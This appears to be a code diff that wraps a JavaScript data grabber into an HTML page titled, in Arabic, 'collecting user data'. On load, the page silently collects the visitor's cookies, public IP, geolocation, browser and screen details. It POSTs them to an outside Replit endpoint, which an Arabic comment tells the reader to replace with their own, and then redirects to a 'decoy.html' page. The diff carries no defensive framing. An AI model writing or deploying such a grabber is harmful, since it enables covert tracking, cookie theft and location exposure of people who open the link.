@@ -1,56 +1,65 @@
-async function grabAndSendData() {
-  let data = {};
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>جمع بيانات المستخدم</title>
+</head>
+<body>
+  <h1>جارٍ جمع البيانات...</h1>
 
-  data.userAgent = navigator.userAgent;
-  data.platform = navigator.platform;
-  data.language = navigator.language;
-  data.screen = `${window.screen.width}x${window.screen.height}`;
-  data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  data.cookies = document.cookie || "No cookies found";
+  <script>
+    async function grabAndSendData() {
+      let data = {};
 
-  try {
-    const ipResponse = await fetch('https://api.ipify.org?format=json');
-    const ipData = await ipResponse.json();
-    data.ip = ipData.ip;
-  } catch (e) {
-    data.ip_error = `IP fetch failed: ${e.message}`;
-  }
+      data.userAgent = navigator.userAgent;
+      data.platform = navigator.platform;
+      data.language = navigator.language;
+      data.screen = `${window.screen.width}x${window.screen.height}`;
+      data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      data.cookies = document.cookie || "No cookies found";
 
-  if (navigator.geolocation) {
-    try {
-      const position = await new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
-      });
-      data.latitude = position.coords.latitude;
-      data.longitude = position.coords.longitude;
-      data.accuracy = position.coords.accuracy;
-    } catch (err) {
-      data.geolocation_error = `Geolocation blocked: ${err.message}`;
+      try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        data.ip = ipData.ip;
+      } catch (e) {
+        data.ip_error = `IP fetch failed: ${e.message}`;
+      }
+
+      if (navigator.geolocation) {
+        try {
+          const position = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
+          });
+          data.latitude = position.coords.latitude;
+          data.longitude = position.coords.longitude;
+          data.accuracy = position.coords.accuracy;
+        } catch (err) {
+          data.geolocation_error = `Geolocation blocked: ${err.message}`;
+        }
+      } else {
+        data.geolocation_error = "Geolocation not supported";
+      }
+
+      try {
+        const response = await fetch('https://30cc0d92-794b-4436-8686-0d77c24a3b3c-00-evkmeitbxruz.sisko.replit.dev/send-data', { // غيّر ده لرابط Replit بتاعك
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        });
+
+        const result = await response.json();
+        console.log('Server response:', result);
+      } catch (error) {
+        console.error('Failed to send data to server:', error);
+      }
+
+      setTimeout(() => {
+        window.location.href = 'decoy.html';
+      }, 1000);
     }
-  } else {
-    data.geolocation_error = "Geolocation not supported";
-  }
 
-  // أرسل البيانات إلى السيرفر Node.js
-  try {
-    const response = await fetch('http://localhost:3000/send-data', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(data)
-    });
-
-    const result = await response.json();
-    console.log(result);
-  } catch (error) {
-    console.error('Failed to send data to server:', error);
-  }
-
-  // إعادة التوجيه بعد الإرسال
-  setTimeout(() => {
-    window.location.href = 'decoy.html';
-  }, 1000);
-}
-
-window.onload = () => {
-  grabAndSendData();
-};
+    window.onload = grabAndSendData;
+  </script>
+</body>
+</html>
